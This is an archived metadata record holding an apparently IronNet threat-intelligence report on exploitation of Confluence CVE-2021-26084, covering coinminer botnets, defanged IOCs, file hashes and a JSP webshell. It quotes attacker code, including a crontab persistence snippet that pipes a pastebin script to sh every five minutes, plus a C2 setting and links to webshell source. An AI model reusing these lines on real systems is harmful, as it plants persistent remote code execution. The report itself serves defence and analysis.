{
    "id": "778679b1-1dcc-4913-a288-4c9a3f0b0828",
    "created_at": "2023-01-12T14:59:40.292898Z",
    "updated_at": "2025-03-27T02:09:07.831121Z",
    "deleted_at": null,
    "sha1_hash": "86fa5c6b040131cf4345d0904ab05251cc387246",
    "title": "2021-10-12 - Continued Exploitation of CVE-2021-26084",
    "authors": "",
    "file_creation_date": "2022-05-28T00:43:01Z",
    "file_modification_date": "2022-05-28T00:43:01Z",
    "file_size": 882896,
    "plain_text": "# Continued Exploitation of CVE-2021-26084\n\n**[ironnet.com/blog/continued-exploitation-of-cve-2021-26084](https://www.ironnet.com/blog/continued-exploitation-of-cve-2021-26084)**\n\nOn August 25, Atlassian publicly released a patch for a critical remote code execution\n[vulnerability in its popular corporate wiki solution Confluence. Just days later, a proof of](https://www.atlassian.com/software/confluence)\nconcept (POC) code demonstrating how to exploit this CVE was published to GitHub. As\nexpected, threat actors rapidly began exploiting publicly facing Confluence servers. As early\n\n\n-----\n\nas September 1, IronNet s threat hunters observed active exploitation of Confluence servers\nwhere cryptocurrency miners and webshells were dropped by what appeared to be multiple\ndistinct threat actors. Similar activity has been observed and documented by other security\norganizations.\n\n## Coinminers\n\n[Like Trend Micro [1] noted in a recent blog post, threat actors dropping the cryptominer,](https://www.trendmicro.com/pt_br/research/21/i/cryptominer-z0miner-uses-newly-discovered-vulnerability-cve-2021.html)\nz0miner, were quick to jump on this vulnerability and have been observed broadly targeting\nvulnerable internet facing servers. IronNet observed similar IOCs to what was reported, in\nsome cases exact matches.\n```\nhxxp://172.96.249.219:88/.jpg\nhxxp://209.141.50.210/syna \nhxxp://27.1.1.34:8080/docs/s/26084.txt \nhxxp://27.1.1.34:8080/docs/s/asd.txt \nhxxp://27.1.1.34:8080/docs/s/conf.txt \nhxxp://27.1.1.34:8080/docs/s/kill.sh \n\n### Botnets pushing XMRig\n\n```\nIronNet observed what appeared to be a number of different botnets, in some cases pushing\nthe same shell script but always ultimately leading to a XMRig coinminer. This was confirmed\nby taking the hash of both of the files and searching in VirusTotal:\n```\nhxxp://m.windowsupdatesupport.org/d/loader.sh\nhxxp://185.186.246.24/d/loader.sh?con\n$ md5sum loader.sh\nd1e6782be9c399dc6fcf591bf6330e9b loader.sh\n$ md5sum loader.sh-con\nd1e6782be9c399dc6fcf591bf6330e9b loader.sh-con\n\n```\nThe shell script first tries to disable security processes and protection mechanisms like\nselinux and apparmor. It will grab its second stage payload via curl or wget if its not available\nusing the below command:\n\n_Figure 1: Second stage payload request_\n\nRequest:\n\n\n-----\n\nUser-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`\n```\n   3 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\n   Edg/91.0.864.64\n\n```\nURL `hxxp://m.windowsupdatesupport.org/d/kworkers`\n\nThis returns the XMRig UPX packed executable and saves it with a filename of `kworkers .`\n```\n$ md5sum kworkers\n9d294620989e33bb3ed4b3ca7e381cc0 kworkers\n\n```\nWe observed a suspected second botnet pushing a different shell script that also eventually\ndrops a XMRig coinminer:\n```\nhxxp://222.117.104.59:8090/about/javaget.txt\n\n```\nBesides killing security processes, this script also attempts to kill other processes that may\nindicate cohabitation by other threat actors. After those commands are executed, a simple\npersistence method via crontab is established and executes shell code downloaded from\npastebin every five seconds:\n\n_Figure 2: Persistence via Crontab_\n```\ncrontab -l | grep -e \"D4EiwzQX\" | grep -v grep\nif [ $? -eq 0 ]; then\n echo \"cron good\"\nelse\n (\n  crontab -r\n  crontab -l 2>/dev/null\n  echo \"*/5 * * * * wget -q hxxps://pastebin.com/raw/D4EiwzQX -O- | sh\"\n ) | crontab fi\n\n```\nFinally, the script will pull down four files:\n```\nhxxp://222.117.104.59:8090/about/config.json\nhxxp://222.117.104.59:8090/about/kill.sh\nhxxp://222.117.104.59:8090/about/solr.sh\nhxxp://222.122.47.27:2143/auth/solrd.exe\n   config.json → XMRig config\n   kill.sh → Shell script to kill its processes\n   solr.sh → Shell script to kill off other malware processes running.\n   solrd.exe → XMRig coinminer\n\n```\n\n-----\n\nLastly, we also observed the Sysrv-Hello Botnet pushing a different shell script that ultimately\nleads to a XMRig coinminer with a similar operation to what was outlined above. In this case,\nhowever, the script sets its C2 in the beginning:\n```\ncc=hxxp://194.145.227.21\n\n```\nAnd pulls down the corresponding compatible binary based on the architecture of the\nsystem:\n\n_Figure 3: Second stage payload request_\n\nSurprise surprise, another XMRig UPX packed executable:\n```\n$ md5sum sys.x86_64\nb0ecaadb4da7c861f3400c6b03ed481b sys.x86_64\n\n```\nNotably, this shell script contains a lateral movement component that leverages the host's\nSSH config to spread. This type of SSH worming capability is fairly standard and can be\nfound in many commodity malware samples.\n\n_Figure 4: Lateral Movement component_\n\n## Webshell\n\nThe webshell used in this attack was a .jsp file, or Jakarta Server Pages, which allows\ndevelopers to dynamically generate HTML web pages in Java. This makes sense since\nConfluence is based in Java, making the execution of .jsp files possible without having to\nadd any further software to the server. After searching Google for some of the unique-looking\nstrings and comments, it is fairly easy to find example source code on GitHub. The webshell\n\n\n-----\n\nobserved by IronNet hunters is largely the same as the webshells found below, with small\nvariations like an updated password for authentication among other minor changes. An\ninteresting change we did observe was that the original webshell contains bug links that lead\nto shack2[.]org, most likely added by the developers of the original shell as this appears to\nbe their group name, and in this case the threat actors have replaced those links with links to\na website hosting adult content.\n\nhttps://github.com/ysrc/webshellsample/blob/master/jsp/013f24efa637d00962abc741457f51a4ee64354c.jsp\n\n[https://github.com/xl7dev/WebShell/blob/master/Jsp/SJavaWebManageV1.4.jsp](https://github.com/xl7dev/WebShell/blob/master/Jsp/SJavaWebManageV1.4.jsp)\n\n**Webshell functionality:**\n\nBelow is a breakdown of the functionality of this webshell along with a brief description of the\nnotable functions. Interestingly, some of the functions have no functionality. Referencing the\nsuspected developers GitHub page, it appears as if some of the modules for the missing\n[functionality are present: https://github.com/shack2. Functions can be omitted in malware for](https://github.com/shack2)\na variety of reasons, but in this case, the threat actor may have only needed limited\nfunctionality and wanted to ensure the webshell payload was lightweight.\n\n**Function Name** **Function Description**\n\n\nEnvsInfo\n\n环境信息\n\nFileManage\n\n文件管理\n\nCMDS\n\n命令执行\n\nDatabase Management\n\n数据库管理\n\nPort Scan\n\n端口扫描\n\n\nDisplays information about the environment\n\nFile manager ability to add / delete / download files\n\nAbility to pass bash commands on the server\n\nPlaceholder function / No functionality\n\nPlaceholder function / No functionality\n\n\n-----\n\nBrute Force\n\n暴力破解\n\nRebound Control\n\n反弹控制\n\nRemote File Download\n\n远程文件下载\n\nRemote Control\n\n远程控制\n\nHelp\n\n帮助\n\nRenew\n\n更新\n\nBug Feedback\n\nbug反馈\n\nQuit\n\n退出\n\n\nPlaceholder function / No functionality\n\nPlaceholder function / No functionality\n\nPlaceholder function / No functionality\n\nPlaceholder function / No functionality\n\nLinks to adult content website\n\nLinks to adult content website\n\nLinks to adult content website\n\nPlaceholder function / No functionality\n\n\nThis exact version of the webshell is relatively new and was first submitted to VirusTotal on\n9/8/2021 and interestingly appears to have been submitted out of Hong Kong via a web\nbrowser. The webshell was also detected by 2 YARA rules from Florian Roth’s THOR APT\nScanner.\n```\nMD5: 25ee4001eb4e91f7ea0bc5d07f2a9744\nSHA256: fcb1ee9c2c0ee0c8afd4324e5958a203481ea201ff1fb573de6e6d6a9e0752da\n\n```\nRules:\n\n\n-----\n\n[https://valhalla.nextron-systems.com/info/rule/APT_CN_JSP_Shack2_Webshell_Apr20_1](https://valhalla.nextron-systems.com/info/rule/APT_CN_JSP_Shack2_Webshell_Apr20_1)\n\n[https://github.com/Neo23x0/signature-base/search?q=webshell_jsp_generic](https://github.com/Neo23x0/signature-base/search?q=webshell_jsp_generic)\n\n## Conclusion\n\nThe techniques and malware used in these attacks are nothing new or particularly\nsophisticated; however, this activity is thought-provoking nonetheless. Firstly, this case\nexemplifies a trend that has been going on for years. Specifically, threat actors - including\nbotnet developers/controllers - are rapidly integrating exploits for known CVEs into their\nspreading capabilities. Multiple times this year alone, defenders have had a few days (at\nbest) between when a vulnerability is made public and when a POC is made available on\nGitHub and integrated into botnet and APT toolkits alike. This only further highlights the need\nfor prompt patching programs by administrators, especially for internet-facing servers. An\nadditional trend that has been observed throughout 2021 is a shift away from compromising\nindividual users as a means of access for threats and a renewed focus on server\nexploitation. This is an obvious example of that shift in tactics.\n\nAlthough the activity observed by IronNet was largely limited to automated exploitation by\nbotnets with what appeared to be financial motivations, we have strong confidence that this\nexploit is being used by more sophisticated threat actors with intelligence collection in mind.\n\n\n-----\n\nGiven the nature of Confluence servers and the type of detailed, sensitive documentation\nthat is commonly stored on them, this is exactly the type of exploit that an APT would\nleverage.\n\n## Source\n\n[1] https://www.trendmicro.com/pt_br/research/21/i/cryptominer-z0miner-uses-newlydiscovered-vulnerability-cve-2021.html\n\nAbout Ironnet\n\nFounded in 2014 by GEN (Ret.) Keith Alexander, IronNet, Inc. (NYSE: IRNT) is a global\ncybersecurity leader that is transforming how organizations secure their networks by\ndelivering the first-ever Collective Defense platform operating at scale. Employing a number\nof former NSA cybersecurity operators with offensive and defensive cyber experience,\nIronNet integrates deep tradecraft knowledge into its industry-leading products to solve the\nmost challenging cyber problems facing the world today.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-12 - Continued Exploitation of CVE-2021-26084.pdf"
    ],
    "report_names": [
        "2021-10-12 - Continued Exploitation of CVE-2021-26084.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535580,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1653698581,
    "ts_modification_date": 1653698581,
    "files": {
        "pdf": "https://archive.orkl.eu/86fa5c6b040131cf4345d0904ab05251cc387246.pdf",
        "text": "https://archive.orkl.eu/86fa5c6b040131cf4345d0904ab05251cc387246.txt",
        "img": "https://archive.orkl.eu/86fa5c6b040131cf4345d0904ab05251cc387246.jpg"
    }
}